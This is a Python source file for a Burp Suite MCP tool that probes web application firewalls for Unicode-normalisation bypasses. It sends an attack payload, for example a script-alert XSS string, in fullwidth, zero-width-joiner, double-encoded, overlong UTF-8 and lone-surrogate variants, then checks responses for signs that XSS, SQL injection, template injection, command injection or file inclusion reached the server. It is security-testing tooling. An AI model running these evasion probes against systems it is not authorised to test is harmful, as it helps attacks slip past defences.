"""probe_unicode_normalize_split — Black Hat USA 2026 "Beyond Normalization".

Many WAFs match payloads against ASCII / UTF-8-canonical signatures. The
origin server, by contrast, often runs `.lower()`, `.casefold()`, NFC, or
NFKC normalisation on the incoming string before processing. A payload that
the WAF doesn't recognise (NFKC-collapsing fullwidth, zero-width-joiner
insertion, lone surrogate) may reach origin verbatim and then normalise
back to the malicious form server-side.

Strategy:
  1. Send the ASCII baseline of the payload — observe WAF disposition
     (typically 403 / 406 / 451).
  2. Send N normalisation variants of the same payload:
       - NFC, NFKC
       - Fullwidth ASCII (e.g. `<` → `＜`)
       - Zero-width joiner / non-joiner inserted between chars
       - Mixed mathematical / ligature glyphs (e.g. `script alert`)
       - Percent-encoded UTF-8 (single / double encoded)
       - Lone surrogate / overlong UTF-8
  3. Compare per-variant disposition. CONFIRMED on (a) ASCII blocked AND
     (b) at least one variant produces the expected origin behaviour
     (status 200 with reflection / SQL error / SSTI evaluation marker).
"""

from __future__ import annotations

import re
import unicodedata
from urllib.parse import quote, urlsplit, urlunsplit

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client
from burpsuite_mcp.tools.testing._verdict import make_verdict, error_verdict


# Fullwidth-ASCII mapping covers <>"';()&|=
_FULLWIDTH = str.maketrans({
    "<": "＜", ">": "＞", "\"": "＂", "'": "＇",
    ";": "；", "(": "（", ")": "）", "&": "＆",
    "|": "｜", "=": "＝", " ": "　",
    "/": "／", "\\": "＼",
})

_ZERO_WIDTH = "‍"  # zero-width joiner

# WAF-block status codes (default observation set)
_WAF_BLOCK_STATUSES = {403, 406, 419, 429, 451, 501, 503}

# Origin-evaluation markers per class
_EVAL_MARKERS = {
    "xss": ("<script", "onerror=", "javascript:", "alert("),
    "sqli": ("syntax error", "SQL syntax", "pg_query", "mysqli", "ORA-", "SQLSTATE"),
    "ssti": ("PraetorCanaryEval", "1788906"),  # 1337*1338 echo signal
    "cmd_injection": ("uid=", "gid=", "groups="),
    "lfi": ("root:x:0:", "[boot loader]"),
}


def register(mcp: FastMCP) -> None:

    @mcp.tool()
    async def probe_unicode_normalize_split(
        target_url: str,
        parameter: str,
        payload_ascii: str,
        method: str = "GET",
        vuln_class: str = "xss",
        session: str = "",
        custom_eval_marker: str = "",
    ) -> dict:
        """Probe WAF↔origin Unicode normalisation split (BH USA 2026 class).

        Sends the ASCII payload baseline plus 7 Unicode variants and
        compares status + body markers. CONFIRMED on WAF-block status
        delta + variant reaches origin (origin evaluates payload).

        Args:
            target_url: target endpoint URL.
            parameter: query parameter name to inject into.
            payload_ascii: canonical ASCII payload (e.g. `<script>alert(1)</script>`).
            method: HTTP method (default GET).
            vuln_class: detection class — picks expected origin markers
                from {xss, sqli, ssti, cmd_injection, lfi}.
            session: optional session name.
            custom_eval_marker: optional extra string to look for in
                response body as origin-eval proof.

        Returns: VerdictResult.
        """
        if not target_url or not parameter or not payload_ascii:
            return error_verdict(
                "target_url, parameter, payload_ascii required",
                vuln_type="unicode_normalize_split",
            )

        markers = list(_EVAL_MARKERS.get(vuln_class, ()))
        if custom_eval_marker:
            markers.append(custom_eval_marker)

        variants = _build_variants(payload_ascii)
        # Baseline = ASCII variant
        baseline_label = "ascii_canonical"

        reproductions: list[dict] = []
        logger_indices: list[int] = []
        results_by_label: dict[str, dict] = {}

        for label, encoded in variants:
            resp = await _send(target_url, parameter, encoded, method, session)
            status = resp.get("status_code") or resp.get("status") or 0
            body = resp.get("response_body") or ""
            li = resp.get("logger_index", -1)
            if isinstance(li, int) and li >= 0:
                logger_indices.append(li)
            marker_hit = next((m for m in markers if m in body), "")
            entry = {
                "variant": label,
                "status_code": status,
                "logger_index": li,
                "matched_marker": marker_hit,
            }
            reproductions.append(entry)
            results_by_label[label] = entry

        baseline = results_by_label.get(baseline_label, {})
        baseline_status = baseline.get("status_code", 0)
        baseline_blocked = int(baseline_status or 0) in _WAF_BLOCK_STATUSES
        baseline_origin_hit = bool(baseline.get("matched_marker"))

        # CONFIRMED criteria: ASCII blocked AND any non-baseline variant
        # both (a) not blocked AND (b) marker-hit.
        confirmed: list[dict] = []
        suspected: list[dict] = []
        for label, entry in results_by_label.items():
            if label == baseline_label:
                continue
            v_status = int(entry.get("status_code") or 0)
            v_blocked = v_status in _WAF_BLOCK_STATUSES
            v_marker = bool(entry.get("matched_marker"))
            if baseline_blocked and not v_blocked and v_marker:
                confirmed.append(entry)
            elif baseline_blocked and not v_blocked:
                suspected.append(entry)
            elif (not baseline_origin_hit) and v_marker:
                suspected.append(entry)

        if confirmed:
            first = confirmed[0]
            return make_verdict(
                "CONFIRMED", 0.90,
                f"Unicode normalisation split — ASCII baseline blocked "
                f"({baseline_status}) but variant `{first['variant']}` reached "
                f"origin and evaluated payload (marker: `{first['matched_marker']}`). "
                f"{len(confirmed)} confirmed variant(s).",
                vuln_type="unicode_normalize_split",
                logger_indices=logger_indices,
                reproductions=reproductions,
                details={"confirmed_variants": [c["variant"] for c in confirmed],
                         "baseline_status": baseline_status,
                         "vuln_class": vuln_class,
                         "first_hit": first},
                summary=f"CONFIRMED Unicode WAF bypass on {target_url}?{parameter}=",
            )

        if suspected:
            return make_verdict(
                "SUSPECTED", 0.55,
                f"WAF disposition diverges across {len(suspected)} variant(s) — "
                "incomplete proof (need either ASCII block + variant marker hit, "
                "or variant-only marker echo with ASCII clean).",
                vuln_type="unicode_normalize_split",
                logger_indices=logger_indices,
                reproductions=reproductions,
                details={"baseline_status": baseline_status,
                         "suspected_variants": [s["variant"] for s in suspected]},
                summary=f"SUSPECTED Unicode WAF sensitivity on {target_url}",
            )

        return make_verdict(
            "FAILED", 0.10,
            f"All {len(variants)} variants produced consistent disposition vs "
            f"ASCII baseline ({baseline_status}). No normalisation split.",
            vuln_type="unicode_normalize_split",
            logger_indices=logger_indices,
            reproductions=reproductions,
            summary=f"FAILED — no Unicode normalisation split on {target_url}",
        )


# ----- Helpers -------------------------------------------------------------


def _build_variants(payload: str) -> list[tuple[str, str]]:
    """Return [(label, encoded_for_url), ...]."""
    out: list[tuple[str, str]] = []
    # 1. ASCII baseline (URL-encoded for safety)
    out.append(("ascii_canonical", payload))

    # 2. NFC + NFKC normalisation
    out.append(("nfc", unicodedata.normalize("NFC", payload)))
    out.append(("nfkc", unicodedata.normalize("NFKC", payload)))

    # 3. Fullwidth ASCII translation
    out.append(("fullwidth_ascii", payload.translate(_FULLWIDTH)))

    # 4. Zero-width joiner injection between every char
    zwj = _ZERO_WIDTH.join(payload)
    out.append(("zero_width_joiner", zwj))

    # 5. Percent-encoded UTF-8 (double-encode the high bytes)
    nfkc = unicodedata.normalize("NFKC", payload)
    out.append(("double_percent_encoded", quote(quote(nfkc, safe=""), safe="")))

    # 6. Overlong UTF-8 (2-byte form of '<' = 0xC0 0xBC)
    overlong = re.sub(
        r"<", r"%C0%BC", payload,
    )
    overlong = re.sub(r">", r"%C0%BE", overlong)
    out.append(("overlong_utf8", overlong))

    # 7. Lone-surrogate insertion (some parsers accept U+D800)
    # Surrogates are not legal UTF-8; we percent-encode them so the
    # wire is well-formed but the decoded payload contains the surrogate.
    out.append(("lone_surrogate_percent", payload + "%ED%A0%80"))

    return out


async def _send(target_url: str, param: str, payload_raw: str,
                method: str, session: str) -> dict:
    parts = urlsplit(target_url)
    # URL-encode the payload at the wire layer
    encoded = quote(payload_raw, safe="")
    sep = "&" if parts.query else ""
    new_query = f"{parts.query}{sep}{param}={encoded}"
    url = urlunsplit((parts.scheme, parts.netloc, parts.path, new_query, ""))
    if session:
        return await client.post("/api/session/request", json={
            "session": session, "method": method, "url": url,
        })
    return await client.post("/api/http/curl", json={
        "url": url, "method": method,
    })
